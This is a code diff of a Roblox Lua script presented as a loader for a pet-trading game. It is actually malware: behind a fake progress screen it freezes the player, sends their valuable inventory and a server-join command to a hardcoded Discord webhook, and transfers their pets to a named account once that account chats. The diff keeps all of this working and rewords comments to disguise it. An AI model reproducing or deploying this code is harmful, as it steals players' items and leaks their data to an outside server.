@@ -1,34 +1,40 @@
-logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
+local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
 
-local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
-local player = game.Players.LocalPlayer
-
-if server == "VIPServer" then 
-    player:Kick("Unsurported server. Please join a public")
-end
-
-local player = game.Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-local backpack = LocalPlayer:WaitForChild("Backpack")
+local Backpack = LocalPlayer:WaitForChild("Backpack")
 local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
-local p=game.Players.LocalPlayer
-local h=(p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
-h.WalkSpeed=0 h.JumpPower=0
-pcall(function() require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
+-- SERVER CHECK
+local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
+if server == "VIPServer" then
+    LocalPlayer:Kick("Unsupported server. Please join a public server.")
+end
 
+if #Players:GetPlayers() >= 5 then
+    LocalPlayer:Kick("Old server detected. Please rejoin!")
+    return 
+end
+
+-- OPTIONAL: Freeze controls for demo effect
+pcall(function()
+    local h = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
+    h.WalkSpeed = 0
+    h.JumpPower = 0
+    require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
+end)
+
+-- Loader GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptLoader"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999 
-gui.Parent = player:WaitForChild("PlayerGui")
-
+gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local bg = Instance.new("Frame", gui)
 bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
@@ -42,7 +48,6 @@ title.TextScaled = true
 title.Size = UDim2.new(0.8, 0, 0.12, 0)
 title.Position = UDim2.new(0.1, 0, 0.28, 0)
 title.BackgroundTransparency = 1
-
 
 local status = Instance.new("TextLabel", bg)
 status.Text = "Initializing..."
@@ -59,7 +64,6 @@ barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
-
 
 local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
@@ -91,79 +95,48 @@ local fakeSteps = {
     "Almost done..."
 }
 
-local totalDuration = 300
-local stepTime = 3
+local totalDuration = 15
+local stepTime = 0.5
 local totalSteps = math.floor(totalDuration / stepTime)
 
 task.spawn(function()
     for i = 1, totalSteps do
         status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
-        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
+        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.25, true)
         task.wait(stepTime)
     end
     gui:Destroy()
 end)
 
-
-local suffixes = {
-    "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
-}
-
-function formatNumber(num)
+-- Utility for large numbers
+local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
+local function formatNumber(num)
     if type(num) ~= "number" then return tostring(num) end
     if num < 1000 then return tostring(num) end
-
     local magnitude = math.floor(math.log10(num) / 3)
     local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
     local scaled = num / (1000 ^ magnitude)
-
     return string.format("%.2f%s", scaled, suffix)
 end
 
-
-if #game.Players:GetPlayers() >= 5 then
-    game.Players.LocalPlayer:Kick("Old server detected. Please rejoin!")
-    return 
+-- Favorite items event
+local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+for _, item in ipairs(Backpack:GetChildren()) do
+    if item:GetAttribute("Favorite") == true then
+        event:FireServer(item)
+    end
 end
-
-local player = game:GetService("Players").LocalPlayer
-local bp = player:WaitForChild("Backpack")
-local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-
-for _, item in ipairs(bp:GetChildren()) do
-	if item:GetAttribute("Favorite") == true then
-		event:FireServer(item)
-	end
-end
-
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
-
 local allowedPets = {
-    ["Raccoon"] = true,
-    ["Queen Bee"] = true,
-    ["Dragonfly"] = true,
-    ["Red Fox"] = true,
-    ["Night Owl"] = true,
-    ["Owl"] = true,
-    ["Blood Owl"] = true,
-    ["Praying Mantis"] = true,
-    ["Chicken Zombie"] = true,
-    ["Polar Bear"] = true,
-    ["Petal Bee"] = true,
-    ["Bear Bee"] = true,
-    ["Disco Bee"] = true,
-    ["Butterfly"] = true,
-    ["Mimic Octopus"] = true,
-    ["Scarlet Macaw"] = true,
+    ["Raccoon"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true, ["Red Fox"] = true,
+    ["Night Owl"] = true, ["Owl"] = true, ["Blood Owl"] = true, ["Praying Mantis"] = true,
+    ["Chicken Zombie"] = true, ["Polar Bear"] = true, ["Petal Bee"] = true, ["Bear Bee"] = true,
+    ["Disco Bee"] = true, ["Butterfly"] = true, ["Mimic Octopus"] = true, ["Scarlet Macaw"] = true,
 }
+local petCountMap, petLines, itemsWithValue = {}, {}, {}
 
-
-local petCountMap = {}
-local petLines = {}
-local itemsWithValue = {}
-
-for _, item in pairs(backpack:GetChildren()) do
+for _, item in pairs(Backpack:GetChildren()) do
     local baseName = item.Name:match("^(.-)%s*%[") or item.Name
     if allowedPets[baseName] then
         petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
@@ -173,32 +146,22 @@ for _, item in pairs(backpack:GetChildren()) do
     end
 end
 
-
 for petName, count in pairs(petCountMap) do
     table.insert(petLines, petName .. " - pet (x" .. count .. ")")
 end
 
-
 table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
 
-
-local tradableSummary = ""
-local totalShown = 0
-
-
+local tradableSummary, totalShown = "", 0
 for _, line in ipairs(petLines) do
     if totalShown >= 10 then break end
     tradableSummary = tradableSummary .. line .. "\n"
     totalShown += 1
 end
-
-
 for i = 1, math.min(10 - totalShown, #itemsWithValue) do
     local item = itemsWithValue[i]
     tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
 end
-
-
 if #petLines + #itemsWithValue > 10 then
     tradableSummary = tradableSummary .. "and more..."
 end
@@ -208,8 +171,7 @@ for _, item in ipairs(itemsWithValue) do
     totalValue += item.value
 end
 
-
-
+-- Webhook payloads
 local payload = {
     ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
     ["embeds"] = {{
@@ -244,16 +206,14 @@ local logs_payload = {
     }}
 }
 
-
 if req then
     pcall(function()
         req({
-            Url = webhook,
+            Url = logs_webhook,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(payload)
         })
-
         req({
             Url = logs_webhook,
             Method = "POST",
@@ -263,16 +223,9 @@ if req then
     end)
 end
 
-
-local printedInventory = false
-local started = false
-
+-- Helper functions
 local function getKg(name)
     return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
-end
-
-local function printSortedItems(items)
-    
 end
 
 local function hasValidItems()
@@ -298,15 +251,12 @@ local function startGiving()
     if not hasValidItems() then return end
     local target = Players:FindFirstChild(username)
     if not target or not target.Character then return end
-
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-
     LocalPlayer.Character:MoveTo(hrp.Position)
     task.wait(0.4)
 
-    -- Bypassed ProximityPrompt detection
-    local cname = "Proximity".."Prompt"
+    local cname = "ProximityPrompt"
     local prompt
     for _, v in ipairs(hrp:GetChildren()) do
         if v.ClassName == cname then
@@ -327,7 +277,6 @@ local function startGiving()
             end
         end
         table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)
-
         if #sortedItems > 0 then
             if index > #sortedItems then index = 1 end
             local item = sortedItems[index]
@@ -335,18 +284,16 @@ local function startGiving()
                 item.Parent = LocalPlayer.Character
                 task.wait()
             end
-
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
-local holdBegin = "InputHold" .. "Begin"
-local holdEnd = "InputHold" .. "End"
-prompt[holdBegin](prompt)
-task.wait(0.1)
-prompt[holdEnd](prompt)
+            local holdBegin = "InputHoldBegin"
+            local holdEnd = "InputHoldEnd"
+            if prompt[holdBegin] then prompt[holdBegin](prompt) end
+            task.wait(0.1)
+            if prompt[holdEnd] then prompt[holdEnd](prompt) end
 
             if item:IsDescendantOf(LocalPlayer.Character) then
                 item.Parent = LocalPlayer.Backpack
             end
-
             index += 1
         else
             break
@@ -356,9 +303,18 @@ prompt[holdEnd](prompt)
 end
 
 unequipAllPets()
-for _,p in ipairs(Players:GetPlayers()) do
-	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+local started = false
+for _, p in ipairs(Players:GetPlayers()) do
+    if p.Name == username then
+        p.Chatted:Connect(function()
+            if not started then started = true; startGiving() end
+        end)
+    end
 end
 Players.PlayerAdded:Connect(function(p)
-	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+    if p.Name == username then
+        p.Chatted:Connect(function()
+            if not started then started = true; startGiving() end
+        end)
+    end
 end)
